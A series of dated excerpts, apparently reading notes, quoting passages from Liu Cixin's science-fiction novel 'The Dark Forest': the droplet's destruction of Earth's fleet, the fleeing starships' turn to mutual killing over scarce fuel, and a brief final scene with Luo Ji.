<p>舰队的指挥系统虽然处于崩溃状态，统帅部对舰队的疏散仍进行着统一的指挥，尽管如此，由于初始队形密集，仍然发生了多起战舰相撞事故。在“喜马拉雅”号与“雷神”号这样的高速迎头相撞中，两舰在瞬间化为碎片完全毁灭；而“信使”号与“创世纪”号发生追尾相撞，两舰的舰体都被撕裂，外泄空气形成呼啸的飓风，把舰内人员同其他物品一起吹到太空中，两艘巨舰的残骸就拖着一条这样的尾迹飘行着……</p>
<p>2016-01-19</p>
<p>最为惨不忍睹的状况发生在“爱因斯坦”号和“夏”号上，两舰舰长竟然用遥控状态绕过系统保护，使战舰进入“前进四”！这时舰上人员均未处于深海保护状态。从“夏”号传出的图像中，人们看到了一个歼击机机库，库中的战机已经清空，但其中仍有上百人，加速开始后，这些人全部被超重压到停机坪上，从这时俯拍的影像中人们看到，在足球场大小的洁白广场上，鲜红的血花一朵朵地迸放开来，超重中的血摊成极薄的一层膜，扩散至很大的面积，最后这些血花都连成一片……最为恐怖的是球形舱中的情形：在超重开始时，舱中所有的人都被滑挤到球形的底部，然后，超重的魔鬼之手把他们的身体像揉一堆湿泥人般揉成一团，没有人来得及发出惨叫，只能听到血液内脏被挤出和骨骼被压碎的声音，后来，这一堆骨肉被血淹没了，超重快速沉淀了血液中的杂质，使其变得异常清澈，强大的重力使血泊的液面像镜面般平整、纹丝不动，像是固态，其中已经完全看不出形状的一堆骨肉和内脏仿佛被封在晶莹的红宝石中……</p>
<p>2016-01-19</p>
<p>人们起初认为“爱因斯坦”号和“夏”号进入前进四是慌乱中的失误，但进一步的资料分析否认了这种看法。在进入四级加速前，战舰的控制系统均有严格的检测程序，在确认舰上人员全部进入深海状态后才会执行加速指令，只有使战舰进入遥控状态后才能绕开这种检测直接进入“前进四”，这需要一系列复杂的操作，不太可能是失误。人们还从两舰发出的信息中发现，在进入“前进四”之前，“爱因斯坦”号和“夏”号一直都在使用舰上的小型飞船和歼击机向外运送人员，直到水滴逼近，两舰附近的战舰纷纷爆炸，它们才进入“前进四”，显然是想借助最高加速摆脱水滴，为人类把完整的战舰保存下来。“爱因斯坦”号和“夏”号最终也未能逃脱水滴的魔掌，这个敏锐的死神很快发现了这两艘大大超出舰群平均加速度的战舰，迅速追上并摧毁了它们那内部已经没有生命的舰体。</p>
<p>2016-01-19</p>
<p>水滴的速度已经超过了第三宇宙速度的十倍，即每秒钟一百七十公里左右。它沿途猛烈撞击着碎片，被撞击的碎片再次熔化并高速飞溅，与其他碎片产生次级撞击，在水滴后面形成灿烂的尾迹。尾迹最初像一颗怒发冲冠的彗星，但很快拉长，变成一条上万公里长的银光巨龙。整个金属云团都映照着巨龙发出的光芒，它在云中上下翻飞，仿佛沉浸在自己疯狂的舞动中。被龙头穿透的一艘艘战舰，在龙体中部爆炸开来，巨龙的身上每时每刻都点缀着四五颗核聚变的小太阳。再往后面，被烧熔的战舰化做百万吨金属岩浆爆发开来，把龙尾染成妖艳的血色……</p>
<p>2016-01-19</p>
<p>三十分钟后，灿烂的巨龙仍在飞翔，但龙身上的核火球已经消失了，龙尾也不再有血色。这时，金属云团中已没有一艘战舰存在。</p>
<p>2016-01-19</p>
<p>水滴开始清除云团外舰队的残余，只有二十一艘战舰冲出了云团，它们中的大部分都因在云中的高速飞行而受到严重损伤，只有很低的加速度或无动力匀速滑行，所以很快被水滴追上并摧毁。这些爆炸的战舰在太空中形成的一朵朵金属云，很快与膨胀的大云团融合在一起。水滴消灭剩下的五艘较为完好的战舰费了些时间，因为它们都已经具有了较高的速度，且逃离的方向不同。水滴追上并摧毁最后一艘战舰“方舟”号时，距云团已经相当远了，“方舟”号爆炸的火球在太空深处孤独地亮了几秒钟后就熄灭了，像一盏消失在旷野风中的孤灯。</p>
<p>2016-01-19</p>
<p>至此，人类的太空武装力量全军覆没。</p>
<p>2016-01-19</p>
<p>水滴接着向“量子”号和“青铜时代”号逃遁的方向加速追击，但很快它就放弃了。这两个目标已经太远且都达到了相当高的速度。于是，“量子”号和“青铜时代”号成为了这场大毁灭中仅有的幸存者。</p>
<p>2016-01-19</p>
<p>除两艘完整的战舰外，舰队中还有少数人从大毁灭中生还，他们主要是在母舰被击毁前乘舰上的小型飞船或歼击机逃离的，水滴当然可以毫不费力地消灭他们，但它对这些小型航天器没有兴趣。对这些航天器最大的威胁是高速飞行的金属碎片，小型航天器自身没有防御系统，也经不起撞击，所以一部分脱离母舰后都被碎片击毁了。在攻击开始时和接近结束时逃离母舰，生还的可能性最大，因为开始时大团金属云还没有形成，而结束时金属云团因自身的膨胀已变得稀薄了许多。那些幸存下来的小型飞船和歼击机在天王星轨道之外的太空中漂流了几天，最后被在这个空间区域航行的民用飞船所救。幸存者的总人数为六万左右，他们中包括最早对水滴的攻击做出正确判断的两名冬眠者军官：赵鑫少尉和李维上尉。</p>
<p>2016-01-19</p>
<p>那片太空沉寂下来，金属云团中的一切都在宇宙的寒冷中失去了光亮，整个云团隐没于黑暗之中。后来，在太阳引力的作用下，云团停止了膨胀，开始拉长，最后变成漫长的条带，在漫长的岁月中，它将变成环绕太阳的一圈极其稀薄的金属带，就像那百万个不能安息的灵魂一样，永远飘浮在太阳系冷寂的外围空间。</p>
<p>毁灭人类全部太空力量的，只是三体世界的一个探测器，同样的探测器，还有九个将在三年后到达太阳系，这十个探测器加在一起，大小也不及一艘三体战舰的万分之一，而这样的三体战舰还有一千艘，正在夜以继日地向太阳系飞来。</p>
<p>2016-01-19</p>
<p>毁灭你，与你有何相干</p>
<p>2016-01-19</p>
<p>长长的睡眠中醒来，章北海一看时间，居然睡了十五个小时，这可能是他除了长达两个世纪的冬眠外睡得最长的一觉了。此时，他有一种新生的感觉，仔细审视自己的内心后，他发现了这种感觉的来源。</p>
<p>他现在是一个人了。</p>
<p>以前，即使独自悬浮在无际的太空中，他也没有一人独处的感觉，父亲的眼睛在冥冥之中看着他，这种目光每时每刻都存在，像白昼的太阳和夜里的星光，已成为他的世界的一部分，而现在父亲的目光消失了。</p>
<p>该出去了。章北海对自己说，同时整理了一下军装，他是在失重中睡眠的，衣服和头发丝毫没乱。最后看了一眼这间自己已经待了一个多月的球形舱室后，章北海打开舱门，飘了出去，他已经准备好平静地面对狂怒的人群，面对无数谴责和鄙夷的目光，面对最后的审判……面对自己不知道还有多长的余生，作为一名已经尽责的军人，不管将遇到什么，这余生肯定是平静的。</p>
<p>2016-01-19</p>
<p>他突然对自己思想的信马由缰感到很惊奇，以前这是一种奢侈，但现在，长达两个世纪的人生使命已经完成，思想可以悠闲地散步了。</p>
<p>2016-01-19</p>
<p>到了转弯处，前面是更长的一段廊道，仍然空空如也，舱壁均匀地发着乳白色的柔光，一时间竟让人失去了立体感，感觉世界好生简洁。两侧的球形舱还是全部大开着门，仍是一模一样的白色球形空间。</p>
<p>2016-01-19</p>
<p>章北海有一种错觉：这些一模一样的白色球形空间充满了周围无限延伸的太空，宇宙就是无限的重复。这时，一个概念突然在他的脑海中出现：全息。</p>
<p>2016-01-19</p>
<p>在每一个球形舱中，都可以实现对“自然选择”号的全部操纵和控制，至少从信息学角度看，每一个舱就是“自然选择”号的全部，所以，“自然选择”号是全息的。</p>
<p>2016-01-19</p>
<p>这艘飞船本身则像一粒金属的种子，携带着人类文明的全部信息，如果能够在宇宙的某处发芽，就有可能再次成长出一个完整的文明。部分包含着全部，所以，人类文明可能也是全息的。章北海失败了，他没能把这粒种子撒出去，他感到遗憾，但并不悲伤，这不仅仅是因为自己尽了责任。他已经获得自由的思想在飞翔，他想到，宇宙很可能也是全息的，每一点都拥有全部，即使有一个原子留下来，就留下了宇宙的一切。他突然有了一种包容一切的寄托感，十多个小时前，当他还在睡梦中时，在太阳系遥远的另一端，丁仪踏上他前往水滴的最后的航程，也有过这种感觉。</p>
<p>2016-01-19</p>
<p>章北海来到了廊道的尽头，打开门，进入了战舰上最大的球形大厅。三个月前，他就是从这里第一次进入“自然选择”号的。现在同那时一样，在球形中央的空间中，悬浮着由舰队官兵组成的方阵，但人数比那时要多几倍。方阵分为三层，“自然选择”号的两千人队列处于中央一层，但章北海看出，只有这一层方阵是真实的，上下两层都是全息图像。他细看后辨认出来，全息图像方阵是由追击舰队四艘战舰的官兵组成的。在三层方阵的正前方，包括东方延绪在内的五名大校军官站成一排，其中四名是追击舰队的舰长。章北海看出里面除了东方延绪外也都是全息图像，这些图像显然是从追击舰队传来的。当章北海飘进球形大厅时，五千多人的目光会聚在他身上，这显然不是看叛逃者的目光，舰长们依次向他敬礼：</p>
<p>“亚洲舰队‘蓝色空间’号！”</p>
<p>“北美舰队‘企业’号！”</p>
<p>“亚洲舰队‘深空’号！”</p>
<p>“欧洲舰队‘终极规律’号！”</p>
<p>东方延绪最后一个向章北海敬礼：“亚洲舰队‘自然选择’号！前辈，您为人类保存下来的五艘星际战舰，也是现在人类太空舰队的全部，现在接受您的指挥！”</p>
<p>2016-01-19</p>
<p>人类仅存的七艘太空战舰都在飞离太阳系，它们分成两部分：一部分是“自然选择”号和追击它的舰队，共五艘战舰；另一部分是从水滴大毁灭中幸存的“量子”号和“青铜时代”号。这两支小舰队分别处于太阳系的两端，它们隔着太阳，沿着几乎相反的方向飞向茫茫太空，渐行渐远。</p>
<p>2016-01-19</p>
<p>在“自然选择”号上，当章北海听完联合舰队全军覆没的过程汇报后，脸上的表情没有变化，目光仍平静如水，只是淡淡地说了一句：“密集编队是个不可原谅的错误，其他的，都在预料之中。</p>
<p>2016-01-19</p>
<p>是的，回不去了，毁灭了联合舰队的水滴还在太阳系中，另外九个水滴也将于三年后到达，对于这支小舰队，曾经的家园现在是一个死亡陷阱。同时，回去已经没有意义，地球世界的末日已经不远，从收到的信息看，人类文明可能等不到三体主力舰队到达就会全面崩溃，这五艘飞船必须承担起延续文明的责任，能做的只有向前飞，向远飞，飞船将是他们永远的家园，太空将是他们最后的归宿。</p>
<p>2016-01-19</p>
<p>这五千五百人就像刚刚割断脐带的婴儿，被残酷地抛向宇宙的深渊，像婴儿一样，他们只想哭。但章北海沉稳的目光像一个强劲的力场维持着阵列的稳定，使人们保持着军人的尊严。对于被抛弃在无边暗夜中的孩子们，最需要的就是父亲，现在，同东方延绪一样，他们从这名来自古代的军人身上感受到了父亲的力量。</p>
<p>2016-01-19</p>
<p>“我们来自地球，也可能是地球文明唯一的继承者，就叫星舰地球吧。”东方延绪说。</p>
<p>2016-01-19</p>
<p>会议首先确定了一件迫在眉睫的事：星舰地球的航行目标。会上一致通过保持现有航向不变。这是章北海在起航时就为“自然选择”号设定的目标，航向指向天鹅座方向，精确目标是NH558J2恒星，这是距太阳系最近的带有行星的恒星之一，它带有两颗行星，都是类似于木星的气液态行星，不适合人类生存，但可以为飞船补充核聚变燃料。现在看来，选择这个目标是经过深思熟虑的，因为在不同方向有另一颗带行星的恒星，据观测，其中一颗行星的自然环境与地球类似，而距离与前一个目标相比只远了一点五光年。但这颗恒星只带有一颗行星，如果这个世界并不适合人类生存（可生存的世界条件十分苛刻，且跨越光年的观测总是有偏差），那星舰地球就失去了补充燃料的机会。而到达NH558J2后，补充了燃料的飞船能以最高航速更快地前往下一个目标。</p>
<p>2016-01-19</p>
<p>NH558J2距太阳系十八光年，按照现在的航速，再考虑到航程中的各种不确定因素，星舰地球可能在两千年后到达。</p>
<p>2016-01-19</p>
<p>两千年，这个冷酷的数字再一次使现实和未来清晰起来。即使考虑到冬眠因素，现在星舰地球的大部分公民也不可能活着到达目的地，他们的人生之路只能是这二十个世纪的漫长航程中的一段。而对于那些到达目的地的后代来说，NH558J2不过是一个中转站，谁也不知道下一个目的地在哪里，更不知道什么时候星舰地球能找到真正适合生存的家园。</p>
<p>2016-01-19</p>
<p>其实，章北海的思考是异常理智的，他清楚地球之所以如此适合人类生存，并不是巧合，更不是什么人择原理的作用，而是地球生物圈与自然环境长期相互作用的结果，这种结果，在其他遥远恒星的行星上不太可能完全重复，他飞向NH558J2的选择蕴涵了一种可能：可生存世界可能永远也找不到，新的人类文明将是永远在航行之中的星舰文明。</p>
<p>2016-01-19</p>
<p>但章北海没有明确表达自己的想法，真正能够接受星舰文明的，可能是星舰地球的下一代人了，这一代人只能把一个想象中的像地球一样的行星家园作为人生的寄托。</p>
<p>2016-01-19</p>
<p>“就是说，我们首先需要制定宪法。”东方延绪说。</p>
<p>“至少是宪法基本原则吧。”</p>
<p>于是，会议在这个方向上展开讨论。大多数人的思想倾向是：星舰地球处于严酷的太空环境中，自身的生态系统又十分脆弱，在这样的条件下生存，必须建立一个纪律严明的社会，必须保证统一行动的意志。于是有人提出：应该保留现有的军队体制。这个想法得到了多数人的赞同。</p>
<p>“就是说一个专制社会。”章北海说。</p>
<p>“前辈，应该有个好听些的名称吧，我们本来就是军队。”“蓝色空间”号舰长说。</p>
<p>“我认为不行。”章北海决然地摇摇头，“仅靠生存本身是不能保证生存的，发展是生存的最好保障。在航程中，我们要发展自己的科学技术，也要扩展舰队的规模。中世纪和大低谷的事实都证明，专制制度是人类发展的最大障碍，星舰地球需要活跃的新思想和创造力，这只有通过建立一个充分尊重人性和自由的社会才能做到。”</p>
<p>“如果前辈指的是建立一个现代地球国际那样的社会，星舰地球可是有先天的条件。”一名下级军官说。</p>
<p>“是的。”东方延绪对发言者点点头，“星舰地球的人数很少，且有极其完善的信息系统，任何问题，都可以很便捷地由全体公民讨论和表决，我们可以建立人类历史上第一个真正的民主社会。”</p>
<p>“也不行。”章北海又摇摇头，“正像前面那些公民所说，星舰地球航行在严酷的太空中，威胁整个世界的灾难随时都可能发生。人类社会在三体危机的历史中已经证明，在这样的灾难面前，尤其是当我们的世界需要牺牲部分来保存整体的时候，你们所设想的那种人文社会是十分脆弱的。”</p>
<p>所有与会者都面面相觑，他们的目光中流露出同一个意思：那该怎么办呢？</p>
<p>章北海笑了笑说：“我想得太简单了，这个问题在整个人类历史上都没有答案，怎么可能在一次会议上解决呢？我想，需要经历一个漫长的实践和探索的过程才能为星舰地球找到合适的社会模式，会后，全体公民应该对此展开充分的讨论……请原谅我干扰了会议的议程，还是按原来的议题进行吧。”</p>
<p>东方延绪从来没有见到章北海有那样的笑容，他很少笑，偶尔笑起来有一种自信和宽容，但他现在却表现出一种从来没有过的羞涩的歉意。虽然会议的这段插曲没有什么结果，但章北海是一个思维极其缜密的人，像这样提出欠思考的意见又收回的事是绝无仅有的，东方延绪从中看出了一种漫不经心，这次会议上他也没有作记录，而以往会议上他作记录都很认真，舰上只有他一个人还在使用古老的纸和笔，这成为他的一个标志。</p>
<p>2016-01-19</p>
<p>那现在是什么占据了他的思想呢？</p>
<p>2016-01-19</p>
<p>章北海说完后转身离去，他那疲惫的身影渐渐飘远，成为巨大的白色球形空间中的一个小黑点。东方延绪看着他消失在一片洁白中，一种从未有过的孤独感从四面八方的白色中涌出来，淹没了她。</p>
<p>2016-01-19</p>
<p>但敌人还是出现了，而且比“N问题”更为凶险，当蓝西和第二战勤部意识到时，他们的阵地已经失陷</p>
<p>2016-01-19</p>
<p>蓝西首先注意到一个奇怪的现象。星舰地球领导机构的第一次选举即将开始，这次选举是面向全民的，对于高层指挥官们来说，他们中的大部分人将面临着从军官向政府官员的转变，他们的位置也将重新洗牌，其中很多人将被来自下层的竞争者代替。蓝西惊奇地发现，在“自然选择”号的高级指挥层，竟然没有人对这次将决定他们今后人生的选举给予太多的注意，他没有看到高层军官中的任何人进行过最起码的竞选活动。谈到选举，他们都没有兴趣，这不由使蓝西想起了第二次公民大会上章北海的心不在焉。</p>
<p>在中校以上军衔的人群中，心理失衡的症候开始出现。他们中的大部分人开始变得越来越内向，长时间地独处沉思，人际交流急剧减少，他们在各种会议上的发言也越来越少，很多人选择了完全沉默。蓝西看到，阳光正在从他们的眼睛中消失，他们的目光都变得阴沉起来，同时，每个人都害怕别人注意到自己目光中的阴霾，不敢与人对视，在偶尔的目光相遇时，会像触电似的立刻把视线移开……级别越高的人，这种症候越严重，同时还有向低层人群扩散蔓延的迹象。</p>
<p>2016-01-19</p>
<p>蓝西决定必须与最高指挥官谈话，于是去找东方延绪。本来，在“自然选择”号乃至整个星舰地球，章北海拥有至高无上的威望和地位，但他放弃了一切，把自己当成一个普通人，退出竞选，只是履行执行舰长的职责，把舰长的指令传达给飞船控制系统。其余时间，他便在“自然选择”号的各处流连，向各级军官和士兵了解飞船的详情，每时每刻都表露着对这艘太空方舟的感情。除此之外，他的心情平静淡然，丝毫未受舰上群体性心理阴影的影响。这固然与他使自己置身事外有关，但蓝西知道还有另一个重要的原因：古人的心理远不如现代人敏感，在目前的情况下，这种麻木是一种良好的自我保护机能。</p>
<p>2016-01-19</p>
<p>是的，在这种环境下，人类的精神将发生根本的变化，人将变成……”东方延绪突然失语，眼中的忧伤消失了，只留下灰暗，就像雨后仍被阴云覆盖的天空。</p>
<p>“你是说，这种环境下，人将变成新人？”</p>
<p>“是新人吗？不，中校，人将变成……非人。”</p>
<p>东方说出的最后两个字让蓝西打了个寒战，他抬头看着她，她的目光并没有回避，但一片空白，蓝西只看到一扇对外界紧闭的心灵之窗。</p>
<p>2016-01-19</p>
<p>我是说，不是以前那种概念的人了……中校，我能说的只有这些，你尽自己的努力就行了，而且……”东方接下来的话像是在梦呓，“也快轮到你了。”</p>
<p>2016-01-19</p>
<p>“伊甸园正在暗下来，黑暗将吞噬一切。”斯科特用疲惫的声音说。</p>
<p>2016-01-19</p>
<p>又看到上校阴影中若隐若现的眼神，蓝西知道什么都问不出来了。于是，他把要问的话压下去，换了一个连他自己都吃惊的问题：“第一个伊甸园发生过的事，都要在第二伊甸园里重复吗？”</p>
<p>2016-01-19</p>
<p>“不知道，反正毒蛇已经出现了，第二伊甸园的毒蛇正在爬上人们的心灵。”</p>
<p>2016-01-19</p>
<p>“被逐出伊甸园的将是谁？”蓝西的声音有些发颤，手心里渗出了冷汗。</p>
<p>“有很多人，但与上次不同，这次可能有人留下。”</p>
<p>“谁？谁留下？”</p>
<p>斯科特长叹一声，“蓝中校，我说得够多了，你为什么不自己去找智慧果？反正人人都要走这一步，不是吗？”</p>
<p>2016-01-19</p>
<p>与斯科特谈话后，心绪纷乱的蓝西停止了忙碌，听从上校的劝告开始静心思考。比他想象的还要快，伊甸园冰凉湿滑的毒蛇也爬进了他的意识，他找到了智慧果并吃下了它，心灵中的最后一缕阳光永远消失了，一切没入黑暗之中。</p>
<p>2016-01-19</p>
<p>在星舰地球中，一根无形的弦在悄悄绷紧，已经到了断裂的边缘。</p>
<p>2016-01-19</p>
<p>“黑，真他妈的黑啊。”舰长自语道，然后开枪自尽了。</p>
<p>2016-01-19</p>
<p>由于沉浸在阴郁的心境中，她这两天几乎把他忘了。他打量着东方延绪，目光中充满着父辈的关切，这目光让东方感到从未有过的舒适，因为现在在星舰地球中，很难再见到这样一双没有阴影的眼睛了。</p>
<p>2016-01-19</p>
<p>东方延绪匆匆地道了别，自顾自飘去，她听到星舰地球的创立者在后面说：“东方，不管是什么事情，顺其自然吧，一切都会好起来的。”</p>
<p>2016-01-19</p>
<p>在球形大厅的中央，东方延绪见到了两位副舰长。之所以选择在这里会面，是因为大厅空间开阔，有身处旷野的感觉，另外他们三人在这里好像处于一个洁白世界的中心，仿佛宇宙中除了他们之外空无一物，这都会令谈话时有一种安全感。</p>
<p>2016-01-19</p>
<p>是第二个人类文明的拂晓，这时发生的任何事情，都可能成为新的《荷马史诗》或《新圣经》的内容。犹大之所以成为犹大，就是因为他最先吻了耶稣，与第二个吻的人有本质的区别。现在也一样，第一个谈这件事情的人将是第二文明史上的一个里程碑，他（她）有可能成为犹大，也有可能成为耶稣，不管是哪种可能，东方延绪都没有这个勇气。</p>
<p>2016-01-19</p>
<p>她必须承担自己的使命，于是做出了一个聪明的选择：没有回避两位副舰长的目光。这个时候，语言已经没有必要，眼睛就能进行所有的交流，他们相互对视着，交错的目光像高速信息通道，把三个心灵联结起来，一切都在对视中飞快地交流着。</p>
<p>2016-01-19</p>
<p>燃料。</p>
<p>燃料。</p>
<p>燃料。</p>
<p>航线上的情况还不明了，但已经探明的至少有两片星际尘埃。</p>
<p>阻力。</p>
<p>当然，穿越之后，飞船的速度将被尘埃阻力降至光速的千分之零点三。</p>
<p>2016-01-19</p>
<p>除非在尘埃中保持速度，或在穿越后加速。</p>
<p>2016-01-19</p>
<p>可是燃料不够。</p>
<p>聚变燃料是飞船的唯一能源，还有其他地方要用：飞船的生态循环系统、可能的航向修正……</p>
<p>2016-01-19</p>
<p>还有到达目标星系时的减速，NH558J2星比太阳的质量小得多，仅靠引力减速不能泊入轨道，要消耗大量燃料减速，否则就掠过了目标星系。</p>
<p>星舰地球的所有燃料，基本上够两艘飞船的。</p>
<p>但要保险些，就只够一艘飞船了。</p>
<p>2016-01-19</p>
<p>不可能。</p>
<p>不可能。</p>
<p>不可能，人太多了，生态循环系统和冬眠系统都容纳不了，现有的容量即使再增加一点人都是灾难性的。</p>
<p>“那么，现在明确了？”东方延绪的声音又在空旷的白色空间中响起，像是沉睡中的人偶尔发出的梦呓。</p>
<p>明确了。</p>
<p>明确了。</p>
<p>一部分人死，或者所有人死。</p>
<p>2016-01-19</p>
<p>这时，目光也沉默了，三个人仿佛被来自宇宙深处的雷霆所震慑，心灵在恐惧中颤抖，每个人都有把目光移开的强烈欲望，但东方延绪首先使自己的目光稳定下来。</p>
<p>“别这样。”她说。</p>
<p>别这样。</p>
<p>别放弃。</p>
<p>不放弃？</p>
<p>不放弃！因为别人不会放弃，我们放弃了，就会被逐出伊甸园。</p>
<p>为什么是我们？</p>
<p>当然也不应该是他们。</p>
<p>谁都不应该是。</p>
<p>但总要有人被逐出，伊甸园只能容下数量有限的人。</p>
<p>我们不想离开伊甸园。</p>
<p>所以不要放弃！</p>
<p>2016-01-19</p>
<p>再往下，这是一个无限的猜疑链</p>
<p>2016-01-19</p>
<p>在地球上可以，但在太空中不行。一部分人死，或者所有人死。这是太空为星舰地球设定的生存死局，一堵不可逾越的墙，在它面前，交流没有任何意义。</p>
<p>2016-01-19</p>
<p>黑，真他妈的黑啊</p>
<p>2016-01-19</p>
<p>“不能再拖了。”东方延绪决然地说。</p>
<p>是不能拖了，在这片黑暗的太空中，决斗者都在凝神屏息，那根弦就要绷断了。</p>
<p>每一秒，危险都在以指数增长。</p>
<p>既然谁先拔枪都一样，不如我们先拔。</p>
<p>2016-01-19</p>
<p>三个人此时都站在一道锋利的刀刃上，被痛苦地切割着，而无论向刀刃的哪一侧跳都是坠入无底深渊，这是太空新人类诞生前的阵痛。</p>
<p>2016-01-19</p>
<p>但这四个光点分别被四个红色的光环套住了，那是四圈死亡的绞索，表示这些目标已经被武器系统锁定！</p>
<p>2016-01-19</p>
<p>东方延绪以最快的速度飞过球形大厅，两位副舰长紧跟着她。他们出门后又穿过长长的廊道，来到章北海的舱室门前，看到他的面前也悬浮着他们刚才看到的同一个界面。他们想冲进去，但“自然选择”号起航逃亡时的那一幕又出现了：他们撞在舱壁上，没有门，只是那一个椭圆形区域的舱壁变得透明了。</p>
<p>2016-01-19</p>
<p>“孩子们。”章北海说，他第一次对他们用这个称呼，虽然只能看到背影，但能够想象出他那平静如水的目光，“这事就由我来做吧。”</p>
<p>“你不下地狱谁下地狱，是吗？”东方延绪大声说。</p>
<p>“从成为军人的那一刻起，我就准备好了去任何地方。”章北海说着，继续进行武器发射前的操作，外面的三人都看到，他虽然很不熟练，但每一步都正确。</p>
<p>泪水从东方的双眼涌出，她喊道：“我们一起去好吗？让我进去，我们一起下地狱！”</p>
<p>章北海没有回答，只是继续操作。他设定了导弹的手动自毁功能，可以在飞行途中由母舰操控自毁，完成这一步后他才说：“东方，你想想，我们以前可能做出这种选择吗？绝不可能，但现在我们做出了，太空使我们变成了新人类。”他把导弹战斗部距目标最近爆炸距离设为五十公里，这样可以尽量避免对目标内部设施的破坏，但即使再远些，也处于对目标内部生命的杀伤距离内，“新的文明在诞生，新的道德也在形成。”他拆除了氢弹战斗部三道保险锁中的第一道，“未来回头看看我们做的这一切，可能是很正常的事，所以，孩子们，我们不会下地狱的。”第二道保险锁也被拆除。</p>
<p>2016-01-19</p>
<p>突然，警报声响彻飞船，如同来自黑暗太空的万鬼哭号，显示界面从半空中像雪片般疯狂地跳出，显示着已经突破“自然选择”号防御系统的来袭导弹的大量信息，但没有人来得及看了。</p>
<p>从警报响起到来袭的次声波氢弹爆炸，只间隔了四秒钟。</p>
<p>从“自然选择”号最后传回地球世界的影像看，章北海可能只用了一秒钟就明白了一切。他本以为自己在两个多世纪的艰难历程中已经心硬如铁，但没有发现心灵最深处隐藏着的那些东西，在做出最后决断前他曾犹豫过，曾经努力抑制住心灵的颤抖，正是心中这最后的柔软杀了他，也杀了“自然选择”号上的所有人，在长达一个月的黑暗对峙中，他只比对方慢了几秒钟。</p>
<p>三颗小太阳亮起，照亮了这片黑暗的空间，它们成一个等边三角形把“自然选择”号围在正中，平均距离飞船约四十公里。核聚变火球的持续时间为二十秒，这期间火球在以次声波频率闪烁，但肉眼是看不出来的。</p>
<p>从传回的影像上看，在剩下的三秒钟时间里，章北海转向东方延绪方向，竟笑了一下，说出了几个字：“没关系的，都一样。”</p>
<p>2016-01-19</p>
<p>对这几个字有猜测的成分，他没来得及说完，强大的电磁脉冲已经从三个方向到达，“自然选择”号巨大的舰体像蝉翼般振动起来，振动的能量转化为次声波，影像中，迷漫的血雾笼罩了一切。</p>
<p>攻击来自“终极规律”号，它向星舰地球的其他四艘飞船发射了十二枚装载着次声波氢弹弹头的隐形导弹，向二十万公里外的“自然选择”号发射的三枚比其他九枚提前了一段时间，以使其和向附近三艘飞船发射的导弹同时到达起爆位置。“终极规律”号上接任自杀舰长的是一位副舰长，但究竟是谁做出了这个终极抉择并首先发动攻击的却不得而知，也永远不可能知道了。</p>
<p>“终极规律”号并没有成为伊甸园最后的幸运儿。</p>
<p>在追击舰队其他三艘战舰中，“蓝色空间”号做好了应对意外事变的准备，在受到攻击前，它的内部已被抽成真空，所有人员都穿上了航天服。由于真空条件下不可能产生次声波，所以没有任何人员伤亡，只是舰体在超强的电磁脉冲中受到了轻微损伤。</p>
<p>当核弹的火球刚刚亮起时，“蓝色空间”号就开始了反击。首先使用反应速度最快的激光武器射击，“终极规律”号立刻被五束高能伽马射线激光击中，舰体被灼出了五个大洞，内部迅速被火焰吞没，并发生了局部爆炸，丧失了一切作战能力。“蓝色空间”更为猛烈的攻击接踵而至，在连续的核导弹和暴雨般的电磁动能弹攻击下，“终极规律”号发生了剧烈爆炸，其中人员无一生还。</p>
<p>2016-01-19</p>
<p>几乎在星舰地球发生这场黑暗战役的同时，在太阳系遥远的另一侧也发生了同样的惨剧：“青铜时代”号对“量子”号发起突然攻击，同样使用次声波氢弹杀死了目标飞船内的全部生命，但保存了目标完整的舰体。由于这两艘飞船传回地球的资料比较少，人们不清楚两舰之间发生了什么。虽然都在大毁灭中进行过剧烈的加速，但两艘飞船都没有像追击舰队那样进行过减速推进，所以它们存留的燃料应该比星舰地球充裕。</p>
<p>2016-01-19</p>
<p>无际的太空就这样在它黑暗的怀抱中哺育出了黑暗的新人类。</p>
<p>2016-01-19</p>
<p>在“终极规律”号爆炸形成的不断扩散的金属云中，“蓝色空间”号靠近已经没有任何生命迹象的“企业”号和“深空”号，收集了它们的所有聚变燃料，随即开始拆卸各种部件，之后，“蓝色空间”号又飞到二十万公里之外的“自然选择”号旁边，做了同样的事情。这期间，星舰地球像一个太空中的大工地，在三艘已经死亡的巨舰的舰体上，点缀着无数的激光焊花，如果章北海还活着，此景一定会让他想起两个世纪前的“唐”号航空母舰。</p>
<p>2016-01-19</p>
<p>蓝色空间”号把已被切割成多段的三艘战舰的残骸围成巨石阵的形状，构建了一处太空陵墓，在这里，为黑暗战役中的全体死难者举行了葬礼</p>
<p>2016-01-19</p>
<p>葬礼上，所有人的心情都是平静的，太空新人类已经度过了婴儿期。</p>
<p>2016-01-19</p>
<p>一盏小小的长明灯亮了起来，它是一个只有五十瓦的小灯泡，旁边还有一百个备用灯泡，可以自动替换损坏的灯泡，长明灯的电源来自一个小型核电池，可以连续亮几万年。它那黯淡的光亮好似山谷中的烛光，在残骸黑暗的高崖上投下一小圈光晕，那片被照亮的钛合金壁上镌刻着所有死难者的名字，没有墓志铭。</p>
<p>2016-01-19</p>
<p>一小时后，太空陵墓被“蓝色空间”号加速的光芒最后一次照亮，陵墓将以光速的百分之一滑行，几百年后，将在星际尘埃中被减速至光速的千分之零点三，在六万年后到达NH558J2，而在这五万多年前，“蓝色空间”号已经从这里飞向下一个星系。</p>
<p>2016-01-19</p>
<p>宇宙也曾经光明过，创世大爆炸后不久，一切物质都以光的形式存在，后来宇宙变成了燃烧后的灰烬，才在黑暗中沉淀出重元素并形成了行星和生命。所以，黑暗是生命和文明之母</p>
<p>2016-01-19</p>
<p>在地球世界，对“蓝色空间”号和“青铜时代”号的谩骂和诅咒排山倒海般涌向外太空，但两艘飞船没有任何回应，它们切断了与太阳系的一切联系，对于这两个世界来说，地球已经死了。</p>
<p>2016-01-19</p>
<p>两艘黑暗之船与黑暗的太空融为一体，隔着太阳系渐行渐远。它们承载着人类的全部思想和记忆，怀抱着地球所有的光荣与梦想，默默地消失在永恒的夜色中。</p>
<p>2016-01-19</p>
<p>市长看到史强身后的罗辑，立刻把手伸向他，“啊，罗辑博士，你好！我认识你，两个世纪前我还是你的崇拜者呢，因为在那四个人中你最像面壁者，当时真猜不透你想干什么。”接着他说出了一句让两人心凉了半截的话，“你是我在这两天里接待的第四个救世主了，还有几十个在外面等着，但我实在没有精力见他们了。”</p>
<p>2016-01-19</p>
